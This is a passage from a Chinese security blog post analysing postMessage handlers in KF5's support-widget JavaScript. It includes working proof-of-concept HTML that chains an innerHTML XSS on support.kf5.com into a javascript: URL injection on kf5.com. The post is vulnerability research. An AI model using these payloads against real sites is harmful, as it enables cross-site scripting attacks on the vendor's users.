<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    bindEvent(<span class="built_in">window</span>, <span class="string">&quot;DOMContentLoaded&quot;</span>, KF5SupportBox.loadConfig), bindEvent(<span class="built_in">window</span>, <span class="string">&quot;load&quot;</span>, KF5SupportBox.loadConfig), bindEvent(<span class="built_in">window</span>.document, <span class="string">&quot;page:load&quot;</span>, KF5SupportBox.loadConfig), bindEvent(<span class="built_in">window</span>.document, <span class="string">&quot;onreadystatechange&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="string">&quot;complete&quot;</span> === <span class="built_in">window</span>.document.readyState &amp;&amp; KF5SupportBox.loadConfig()</span><br><span class="line">    &#125;), <span class="built_in">window</span>.initializeKF5SupportBox || (<span class="built_in">window</span>.initializeKF5SupportBox = KF5SupportBox.loadConfig), bindEvent(<span class="built_in">window</span>, <span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> e, n, o;</span><br><span class="line">        <span class="keyword">if</span> (t.origin.match(<span class="regexp">/^https?:\/\/(.*)$/</span>)[<span class="number">1</span>] === kf5Domain) <span class="keyword">if</span> (t.data &amp;&amp; <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> t.data &amp;&amp; (e = t.data.match(<span class="regexp">/^([^ ]+)(?: +(.*))?/</span>), n = e[<span class="number">1</span>], o = e[<span class="number">2</span>]), <span class="string">&quot;CMD::showSupportbox&quot;</span> === n) KF5SupportBox.instance &amp;&amp; (KF5SupportBox.instance.open(), KF5SupportBox.instance.hideButton()); <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::hideSupportbox&quot;</span> === n) KF5SupportBox.instance &amp;&amp; KF5SupportBox.instance.close(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            KF5SupportBox.instance.showButton()</span><br><span class="line">        &#125;); <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::resizeIframe&quot;</span> === n) ; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::kf5Notice&quot;</span> === n) KF5SupportBox.instance &amp;&amp; KF5SupportBox.instance.showNotice(o &amp;&amp; <span class="built_in">JSON</span>.parse(o)); <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::newMsgCountNotice&quot;</span> === n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (KF5SupportBox.instance) &#123;</span><br><span class="line">                <span class="keyword">var</span> i = KF5SupportBox.instance.getElement(<span class="string">&quot;#msg-number&quot;</span>);</span><br><span class="line">                o = <span class="built_in">parseInt</span>(o), o ? (i.style.display = <span class="string">&quot;block&quot;</span>, i.innerHTML = o &lt; <span class="number">10</span> ? o : <span class="string">&quot;...&quot;</span>) : (i.style.display = <span class="string">&quot;none&quot;</span>, i.innerHTML = <span class="string">&quot;&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::showImage&quot;</span> === n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (KF5SupportBox.instance) &#123;</span><br><span class="line">                <span class="keyword">var</span> s = KF5SupportBox.instance.getElement(<span class="string">&quot;#kf5-view-image&quot;</span>),</span><br><span class="line">                    a = KF5SupportBox.instance.getElement(<span class="string">&quot;#kf5-backdrop&quot;</span>), r = s.parentNode || s.parentElement;</span><br><span class="line">                o = o ? <span class="built_in">JSON</span>.parse(o) : &#123;&#125;, a.style.display = <span class="string">&quot;block&quot;</span>, r.setAttribute(<span class="string">&quot;href&quot;</span>, o.url), r.setAttribute(<span class="string">&quot;title&quot;</span>, o.name || <span class="string">&quot;&quot;</span>), s.setAttribute(<span class="string">&quot;src&quot;</span>, o.url), s.setAttribute(<span class="string">&quot;alt&quot;</span>, o.name || <span class="string">&quot;&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="string">&quot;CMD::iframeReady&quot;</span> === n &amp;&amp; KF5SupportBox.instance.onIframeReady()</span><br><span class="line">    &#125;), <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> lang &amp;&amp; lang &amp;&amp; KF5SupportBoxAPI.ready(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        KF5SupportBoxAPI.useLang(lang)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在setup方法当中, 可以看到监听了window对象的message事件, 但是限制了来源(修复1), 在来源符合要求的情况下直接往这个页面postmessage就可以触发这个事件了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (t.origin.match(<span class="regexp">/^https?:\/\/(.*)$/</span>)[<span class="number">1</span>] === kf5Domain) <span class="keyword">if</span> (t.data &amp;&amp; <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> t.data &amp;&amp; (e = t.data.match(<span class="regexp">/^([^ ]+)(?: +(.*))?/</span>), n = e[<span class="number">1</span>], o = e[<span class="number">2</span>])</span><br></pre></td></tr></table></figure>
<p>判断了postmessage的来源是不是kf5Domain, 如果是的话,才会进入下一个if然后再给n、o变量赋值。 如果不是的话, 没法进入if, n、o变量就都为两个未初始化的变量, 就利用不上了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">script = <span class="built_in">window</span>.document.getElementById(<span class="string">&quot;kf5-provide-supportBox&quot;</span>),</span><br><span class="line">        parts = script.src.split(<span class="string">&quot;//&quot;</span>), assetsHost = parts.length &gt; <span class="number">1</span> ? parts[<span class="number">1</span>].split(<span class="string">&quot;/&quot;</span>)[<span class="number">0</span>] : <span class="string">&quot;assets.kf5.com&quot;</span>,</span><br><span class="line">        kf5Domain = script.getAttribute(<span class="string">&quot;kf5-domain&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>kf5Domain来自id为kf5-provide-supportBox的标签的kf5-domain属性。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//assets-cdn.kf5.com/supportbox_v2/main.js?v=20170307&quot;</span> <span class="attr">id</span>=<span class="string">&quot;kf5-provide-supportBox&quot;</span> <span class="attr">kf5-domain</span>=<span class="string">&quot;support.kf5.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>所以kf5-domain就为support.kf5.com。 这里我们需要找一个support.kf5.com的xss才能接着看这个postmessage了。</p>
<p>找support.kf5.com的xss, 我还是首先看看有没有类似的postmessage造成的xss<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/sx_1.jpg" alt="-w1299"></p>
<p>一共监听了三个message事件, 在查看第一个的时候就发现了存在xss.<br><a target="_blank" rel="noopener" href="https://assets-cdn.kf5.com/supportbox_v2/main.js?v=20170307">https://assets-cdn.kf5.com/supportbox_v2/main.js?v=20170307</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.initializeKF5SupportBox || (<span class="built_in">window</span>.initializeKF5SupportBox = KF5SupportBox.loadConfig),</span><br><span class="line">    bindEvent(<span class="built_in">window</span>, <span class="string">&quot;message&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> e, i, n;</span><br><span class="line">        <span class="keyword">if</span> (t.data &amp;&amp; <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> t.data &amp;&amp; (e = t.data.match(<span class="regexp">/^([^ ]+)(?: +(.*))?/</span>),</span><br><span class="line">            i = e[<span class="number">1</span>],</span><br><span class="line">            n = e[<span class="number">2</span>]),</span><br><span class="line">        <span class="string">&quot;CMD::showSupportbox&quot;</span> === i)</span><br><span class="line">            KF5SupportBox.instance &amp;&amp; (KF5SupportBox.instance.open(),</span><br><span class="line">                KF5SupportBox.instance.hideButton());</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::hideSupportbox&quot;</span> === i)</span><br><span class="line">            KF5SupportBox.instance &amp;&amp; KF5SupportBox.instance.close(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                KF5SupportBox.instance.showButton()</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::resizeIframe&quot;</span> === i)</span><br><span class="line">            ;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::kf5Notice&quot;</span> === i)</span><br><span class="line">            KF5SupportBox.instance &amp;&amp; KF5SupportBox.instance.showNotice(n &amp;&amp; <span class="built_in">JSON</span>.parse(n));</span><br></pre></td></tr></table></figure>
<p>这个文件和之前未修复的文件很像, 没有限制来源。</p>
<p>再对传递过来的message数据通过正则以第一个空格分为两组, n变量为空格之前的字符, o变量为空格之后的字符。<br>n变量是用来选择进入哪个分支的, 这里看一下CMD::kf5Notice分支, 在进入CMD::kf5Notice分支之后会继续执行</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::kf5Notice&quot;</span> === n) </span><br><span class="line">KF5SupportBox.instance &amp;&amp; KF5SupportBox.instance.showNotice(o &amp;&amp; <span class="built_in">JSON</span>.parse(o));</span><br></pre></td></tr></table></figure>
<p>这里对o变量从字符串解析到JSON之后, 作为参数传递到了showNotice方法。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">showNotice: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="built_in">this</span></span><br><span class="line">        , i = <span class="built_in">window</span>.document.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> t = <span class="string">&quot;object&quot;</span> == <span class="keyword">typeof</span> t ? t : &#123;&#125;,</span><br><span class="line">        i.innerHTML = <span class="built_in">this</span>.getOpt(<span class="string">&quot;noticeTemplate&quot;</span>).replace(<span class="string">&quot;&#123;&#123;title&#125;&#125;&quot;</span>, t.title || <span class="string">&quot;提示信息&quot;</span>).replace(<span class="string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>, t.content || <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&#123;avatar&#125;&#125;&quot;</span>, t.avatar || <span class="built_in">this</span>.getOpt(<span class="string">&quot;defaultNoticeAvatar&quot;</span>)).replace(<span class="string">&quot;&#123;&#123;submitText&#125;&#125;&quot;</span>, t.submitText || <span class="string">&quot;接受&quot;</span>).replace(<span class="string">&quot;&#123;&#123;cancelText&#125;&#125;&quot;</span>, t.cancelText || <span class="string">&quot;拒绝&quot;</span>),</span><br><span class="line">        <span class="built_in">this</span>.closeNotice(),</span><br><span class="line">        <span class="built_in">this</span>.noticeElement = i,</span><br><span class="line">        <span class="number">1</span> === <span class="built_in">this</span>.getOpt(<span class="string">&quot;version&quot;</span>) ? <span class="built_in">document</span>.body.appendChild(i) : <span class="built_in">this</span>.el &amp;&amp; <span class="built_in">this</span>.el.appendChild(i),</span><br><span class="line">        bindEvent(<span class="built_in">document</span>.getElementById(<span class="string">&quot;kf5-support-message-accept&quot;</span>), <span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            e.open(),</span><br><span class="line">                e.hideButton(),</span><br><span class="line">            e.iframe &amp;&amp; e.iframe.contentWindow &amp;&amp; e.iframe.contentWindow.postMessage(<span class="string">&quot;CMD::kf5NoticeAccepted &quot;</span> + <span class="built_in">JSON</span>.stringify(t.data), <span class="string">&quot;*&quot;</span>),</span><br><span class="line">                e.closeNotice()</span><br><span class="line">        &#125;),</span><br><span class="line">        bindEvent(<span class="built_in">document</span>.getElementById(<span class="string">&quot;kf5-support-message-reject&quot;</span>), <span class="string">&quot;click&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            e.iframe &amp;&amp; e.iframe.contentWindow &amp;&amp; e.iframe.contentWindow.postMessage(<span class="string">&quot;CMD::kf5NoticeRejected &quot;</span> + <span class="built_in">JSON</span>.stringify(t.data), <span class="string">&quot;*&quot;</span>),</span><br><span class="line">                e.closeNotice()</span><br><span class="line">        &#125;),</span><br><span class="line">        i</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>showNotice方法中, 使用传入进来的json对模板中的变量进行替换之后, 直接就进行innerHTML了, 可以直接xss。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://support.kf5.com&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> popup = demo.contentWindow;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        var msg = &#x27;CMD::kf5Notice &#123;&quot;content&quot;: &quot;<span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(document.domain)</span> /&gt;</span>&quot;&#125;&#x27;</span></span></span><br><span class="line"><span class="javascript">        popup.postMessage(msg, <span class="string">&quot;*&quot;</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/sx_2.jpg" alt="-w1019"></p>
<p>但是这里只是<a target="_blank" rel="noopener" href="https://assets-cdn.kf5.com/supportbox_v2/main.js">https://assets-cdn.kf5.com/supportbox_v2/main.js</a> 的xss而已, 其他客户引入的js都是<a target="_blank" rel="noopener" href="http://assets-cdn.kf5.com//supportbox//main.js">http://assets-cdn.kf5.com//supportbox//main.js</a> 。 所以继续尝试看看能不能使用supportbox_v2的xss来触发supportbox的xss。<br>现在找到了support.kf5.com的xss, 可以通过postmessage的来源判断了。<br>再继续往下看supportbox/main.js。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">showNotice: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                o.open(), o.hideButton(), o.iframe &amp;&amp; o.iframe.contentWindow &amp;&amp; o.iframe.contentWindow.postMessage(<span class="string">&quot;CMD::kf5NoticeAccepted &quot;</span> + <span class="built_in">JSON</span>.stringify(t.data), <span class="string">&quot;*&quot;</span>), o.closeNotice()</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> n, o = <span class="built_in">this</span>;</span><br><span class="line">            <span class="keyword">return</span> t = <span class="string">&quot;object&quot;</span> == <span class="keyword">typeof</span> t ? t : &#123;&#125;, n = renderTemplate(<span class="built_in">this</span>.getOpt(<span class="string">&quot;noticeTemplate&quot;</span>), &#123;</span><br><span class="line">                noticeTitle: t.title || <span class="string">&quot;æç¤ºä¿¡æ¯&quot;</span>,</span><br><span class="line">                noticeContent: t.content || <span class="string">&quot;&quot;</span>,</span><br><span class="line">                noticeAvatar: t.avatar || <span class="built_in">this</span>.getOpt(<span class="string">&quot;defaultNoticeAvatar&quot;</span>),</span><br><span class="line">                noticeAccept: t.submitText || <span class="string">&quot;æŽ¥å—&quot;</span>,</span><br><span class="line">                noticeReject: t.cancelText || <span class="string">&quot;æ‹’ç»&quot;</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>supportbox中的showNotice并没有像supportbox_v2一样直接replace变量后就innerHTML, 而是使用了renderTemplate。(修复2）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">renderTemplate</span>(<span class="params">t, e, n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o, i = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">    i.innerHTML = t;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> s <span class="keyword">in</span> e) e.hasOwnProperty(s) &amp;&amp; (o = i.getElementsByClassName ? i.getElementsByClassName(<span class="string">&quot;kf5-tpl-&quot;</span> + s) : getElementsByClassName(i, <span class="string">&quot;kf5-tpl-&quot;</span> + s), (o = o.length ? o[<span class="number">0</span>] : <span class="literal">null</span>) &amp;&amp; (n &amp;&amp; <span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> n[s] ? n[s](o, e[s]) : <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> o.textContent ? o.textContent = e[s] : o.innerText = e[s]));</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而在renderTemplate当中, 使用的是innerText, 所以不能xss。<br>这里就只有选择其他的分支尝试xss, 但是看完了几个分支, 都没有合适的点可以xss, 只找到了一个地方能够点击xss(实在没啥用,并且我都不知道咋样才能点到这个a标签)。   </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;CMD::showImage&quot;</span> === n) &#123;</span><br><span class="line">                <span class="keyword">if</span> (KF5SupportBox.instance) &#123;</span><br><span class="line">                    <span class="keyword">var</span> s = KF5SupportBox.instance.getElement(<span class="string">&quot;#kf5-view-image&quot;</span>),</span><br><span class="line">                        a = KF5SupportBox.instance.getElement(<span class="string">&quot;#kf5-backdrop&quot;</span>), r = s.parentNode || s.parentElement;</span><br><span class="line">                    o = o ? <span class="built_in">JSON</span>.parse(o) : &#123;&#125;, a.style.display = <span class="string">&quot;block&quot;</span>, r.setAttribute(<span class="string">&quot;href&quot;</span>, o.url), r.setAttribute(<span class="string">&quot;title&quot;</span>, o.name || <span class="string">&quot;&quot;</span>), s.setAttribute(<span class="string">&quot;src&quot;</span>, o.url), s.setAttribute(<span class="string">&quot;alt&quot;</span>, o.name || <span class="string">&quot;&quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>在CMD::showImage分支下, 可以设置#kf5-view-image的alt/src属性。<br>可以设置#kf5-view-image标签的父节点的href/title属性。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/sx_3.jpg" alt="-w478"><br>kf5-view-image标签是img标签, 他的父节点是a标签。 所以可以通过父节点的href属性进行点击xss。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/sx_4.jpg" alt="-w1381"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://support.kf5.com&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="handlebars"><span class="xml">        var content = `<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">https://www.kf5.com/</span> <span class="attr">id</span>=<span class="string">demo2</span> <span class="attr">onload</span>=<span class="string">&#x27;var popup2 = demo2.contentWindow;var msg2 =\\\&quot;CMD::showImage &#123;\\\\\\&quot;url\\\\\\&quot;:\\\\\\&quot;javascript:alert(document.domain)\\\\\\&quot;&#125;\\\&quot;;popup2.postMessage(msg2, \\\&quot;*\\\&quot;); &#x27;</span>&gt;</span>`</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> popup = demo.contentWindow;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> msg = <span class="string">`CMD::kf5Notice &#123;&quot;content&quot;: &quot;<span class="subst">$&#123;content&#125;</span>&quot;&#125;`</span></span></span><br><span class="line"><span class="javascript">        popup.postMessage(msg, <span class="string">&quot;*&quot;</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://5alt.me/">https://5alt.me/</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>




<nav class="pagination">
  
  
  <a href="/page/2/" class="pagination-next">Next</a>
  
</nav>
    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2020 雨了个雨
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>